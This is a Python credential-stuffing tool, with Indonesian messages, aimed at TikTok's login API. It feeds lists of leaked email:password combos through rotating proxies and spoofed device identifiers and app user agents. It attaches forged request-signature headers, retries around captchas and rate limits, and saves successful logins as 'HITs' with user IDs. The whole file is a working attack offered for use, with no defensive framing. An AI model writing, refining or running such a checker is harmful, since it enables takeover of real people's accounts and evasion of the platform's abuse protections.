import requests
import random
import string
import time
import threading
import hashlib
import re
import os
import json
from concurrent.futures import ThreadPoolExecutor

# ================== KONFIGURASI ==================
THREADS = 10
TIMEOUT = 15
MIN_DELAY = 1.5
MAX_DELAY = 4.0
MAX_RETRY = 3
CHECKPOINT_FILE = "tt_checkpoint.json"
PROXY_HEALTH_URL = "http://httpbin.org/ip"
# =================================================

USER_AGENTS = [
    "com.zhiliaoapp.musically/300904 (Linux; U; Android 10; en; Pixel 4; Build/QQ3A.200805.001; Cronet/58.0.2991.0)",
    "com.zhiliaoapp.musically/300904 (Linux; U; Android 11; en; SM-G991B; Build/RP1A.200720.012; Cronet/58.0.2991.0)",
    "com.zhiliaoapp.musically/300904 (Linux; U; Android 12; en; Mi 10; Build/SKQ1.211006.001; Cronet/58.0.2991.0)",
    "com.zhiliaoapp.musically/300904 (Linux; U; Android 9; en; ONEPLUS A6003; Build/PKQ1.180716.001; Cronet/58.0.2991.0)",
    "com.zhiliaoapp.musically/300904 (Linux; U; Android 13; en; Pixel 7; Build/TQ1A.230205.002; Cronet/58.0.2991.0)",
    "com.zhiliaoapp.musically/300904 (Linux; U; Android 10; en; Redmi Note 8; Build/QKQ1.200114.002; Cronet/58.0.2991.0)",
    "com.zhiliaoapp.musically/300904 (Linux; U; Android 11; en; SM-A515F; Build/RP1A.200720.012; Cronet/58.0.2991.0)",
    "com.zhiliaoapp.musically/300904 (Linux; U; Android 12; en; V2109; Build/SP1A.210812.003; Cronet/58.0.2991.0)",
]

_proxies = []
_proxy_health = {}
_lock = threading.Lock()
_index = 0

def load_proxies(path="proxy.txt"):
    global _proxies, _proxy_health
    if not os.path.exists(path):
        print("[!] proxy.txt tidak ditemukan, running tanpa proxy")
        _proxies = []
        return
    raw = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            raw.append(line)
    seen = set()
    valid = []
    for p in raw:
        if p in seen:
            continue
        seen.add(p)
        if re.match(r"^(\S+:\S+@)?[\d\.]+:\d+$", p) or re.match(r"^(\S+:\S+@)?[\w\.\-]+:\d+$", p):
            valid.append(p)
    _proxies = valid
    _proxy_health = {p: True for p in valid}
    print(f"[+] Loaded {len(_proxies)} proxies (valid, deduped)")

def check_proxy_health(proxy, timeout=5):
    try:
        r = requests.get(
            PROXY_HEALTH_URL,
            proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"},
            timeout=timeout
        )
        return r.status_code == 200
    except:
        return False

def health_check_all(max_workers=20):
    if not _proxies:
        return
    print(f"[+] Health checking {len(_proxies)} proxies...")
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        results = list(ex.map(lambda p: (p, check_proxy_health(p)), _proxies))
    alive = 0
    for p, ok in results:
        _proxy_health[p] = ok
        if ok:
            alive += 1
    print(f"[+] Proxy alive: {alive}/{len(_proxies)}")

def get_proxy():
    global _index
    if not _proxies:
        return None
    with _lock:
        for _ in range(len(_proxies)):
            p = _proxies[_index % len(_proxies)]
            _index += 1
            if _proxy_health.get(p, True):
                return {"http": f"http://{p}", "https": f"http://{p}"}
    return None

def random_device_id():
    return "".join(random.choices(string.digits + string.ascii_lowercase, k=19))

def random_iid():
    return str(random.randint(7000000000000000000, 7999999999999999999))

def random_openudid():
    return "".join(random.choices("0123456789abcdef", k=16))

def random_delay():
    time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))

def backoff_delay(attempt):
    base = min(2 ** attempt, 30)
    time.sleep(base + random.uniform(0, 2))

def generate_x_gorgon(params, data, ts):
    raw = f"{ts}{json.dumps(params, sort_keys=True)}{json.dumps(data, sort_keys=True)}{random.random()}"
    h = hashlib.md5(raw.encode()).hexdigest()
    return "0404b0c4" + h[:16]

def generate_x_argus(params, data, ts):
    raw = f"{ts}{json.dumps(params, sort_keys=True)}{json.dumps(data, sort_keys=True)}"
    return hashlib.sha256(raw.encode()).hexdigest()[:32]

def generate_x_ladon(params, data, ts):
    raw = f"ladon{ts}{json.dumps(params, sort_keys=True)}{json.dumps(data, sort_keys=True)}"
    return hashlib.sha256(raw.encode()).hexdigest()[:32]

def build_request(email, password):
    device_id = random_device_id()
    iid = random_iid()
    openudid = random_openudid()
    ts = int(time.time())
    ua = random.choice(USER_AGENTS)

    params = {
        "aid": "1233", "app_name": "musical_ly",
        "device_platform": "android", "version_code": "300904",
        "version_name": "30.9.4", "os_version": "10",
        "device_type": "Pixel 4", "device_id": device_id,
        "iid": iid, "channel": "googleplay", "language": "en",
        "os_api": "29", "ac": "wifi", "openudid": openudid,
        "resolution": "1080*2340", "dpi": "440", "density_dpi": "440",
    }
    data = {
        "email": email, "password": password,
        "account_sdk_source": "app", "mix_mode": "1",
        "multi_login": "1", "type": "1",
    }
    headers = {
        "User-Agent": ua,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip",
        "X-Gorgon": generate_x_gorgon(params, data, ts),
        "X-Khronos": str(ts),
        "X-Argus": generate_x_argus(params, data, ts),
        "X-Ladon": generate_x_ladon(params, data, ts),
    }
    return params, headers, data

def is_valid_combo(combo):
    if ":" not in combo:
        return False
    email, pwd = combo.split(":", 1)
    if not email or not pwd:
        return False
    if "@" not in email or "." not in email.split("@")[-1]:
        return False
    if len(pwd) < 4:
        return False
    return True

def check_tiktok(email, password):
    url = "https://api16-normal-c-useast1a.tiktokv.com/passport/user/login/"
    last_status = None
    for attempt in range(MAX_RETRY):
        params, headers, data = build_request(email, password)
        proxy = get_proxy()
        try:
            r = requests.post(url, params=params, headers=headers, data=data,
                              timeout=TIMEOUT, proxies=proxy)
            if r.status_code == 200:
                res = r.json()
                d = res.get("data", {}) or {}
                if d.get("user_id"):
                    return ("HIT", f"{email}:{password}", d["user_id"], d.get("username", "-"))
                elif d.get("error_code") == 1003:
                    return ("WRONG", f"{email}:{password}", None, None)
                elif "captcha" in str(res).lower() or d.get("error_code") == 1105:
                    last_status = ("CAPTCHA", f"{email}:{password}", None, None)
                    backoff_delay(attempt)
                    continue
                return ("UNKNOWN", f"{email}:{password}", d.get("message", "-"), None)
            elif r.status_code == 429:
                backoff_delay(attempt)
                last_status = ("RATELIMIT", f"{email}:{password}", 429, None)
                continue
            elif r.status_code == 403:
                if proxy:
                    with _lock:
                        for p in _proxies:
                            if f"http://{p}" == proxy["http"]:
                                _proxy_health[p] = False
                                break
                backoff_delay(attempt)
                last_status = ("FORBIDDEN", f"{email}:{password}", 403, None)
                continue
            elif r.status_code >= 500:
                backoff_delay(attempt)
                last_status = ("SERVERERR", f"{email}:{password}", r.status_code, None)
                continue
            return ("ERROR", f"{email}:{password}", r.status_code, None)
        except requests.exceptions.Timeout:
            last_status = ("TIMEOUT", f"{email}:{password}", None, None)
            backoff_delay(attempt)
        except requests.exceptions.ProxyError:
            if proxy:
                with _lock:
                    for p in _proxies:
                        if f"http://{p}" == proxy["http"]:
                            _proxy_health[p] = False
                            break
            backoff_delay(attempt)
            last_status = ("PROXYERR", f"{email}:{password}", None, None)
        except Exception as e:
            last_status = ("FAIL", f"{email}:{password}", str(e), None)
            backoff_delay(attempt)
    return last_status or ("FAIL", f"{email}:{password}", "max retry", None)

def save_checkpoint(done_count, total, hits, wrong, captcha, errors):
    try:
        with open(CHECKPOINT_FILE, "w") as f:
            json.dump({"done": done_count, "total": total, "hits": hits,
                       "wrong": wrong, "captcha": captcha, "errors": errors,
                       "ts": time.time()}, f)
    except Exception as e:
        print(f"[!] Checkpoint save error: {e}")

def load_checkpoint():
    if not os.path.exists(CHECKPOINT_FILE):
        return None
    try:
        with open(CHECKPOINT_FILE) as f:
            return json.load(f)
    except:
        return None

def clear_checkpoint():
    try:
        if os.path.exists(CHECKPOINT_FILE):
            os.remove(CHECKPOINT_FILE)
    except:
        pass

def run_tiktok_checker(combos, progress_cb=None, resume=False):
    load_proxies()
    health_check_all()
    valid_combos = [c for c in combos if is_valid_combo(c)]
    skipped = len(combos) - len(valid_combos)
    start_from = 0
    if resume:
        cp = load_checkpoint()
        if cp:
            start_from = cp.get("done", 0)
            print(f"[+] Resume dari combo ke-{start_from}")
    valid_combos = valid_combos[start_from:]
    hits, wrong, captcha, errors = [], 0, 0, 0
    done = start_from
    total = len(combos)
    lock = threading.Lock()

    def task(c):
        nonlocal done
        e, p = c.split(":", 1)
        random_delay()
        res = check_tiktok(e, p)
        with lock:
            done += 1
            if progress_cb and done % 10 == 0:
                progress_cb(done, total)
            if done % 50 == 0:
                save_checkpoint(done, total, hits, wrong, captcha, errors)
        return res

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        results = list(ex.map(task, valid_combos))

    for status, combo, extra, uname in results:
        if status == "HIT":
            hits.append(f"{combo} | UID: {extra} | Username: {uname}")
        elif status == "WRONG":
            wrong += 1
        elif status == "CAPTCHA":
            captcha += 1
        else:
            errors += 1
    clear_checkpoint()
    return {"hits": hits, "wrong": wrong, "captcha": captcha,
            "errors": errors, "skipped": skipped, "total": total}
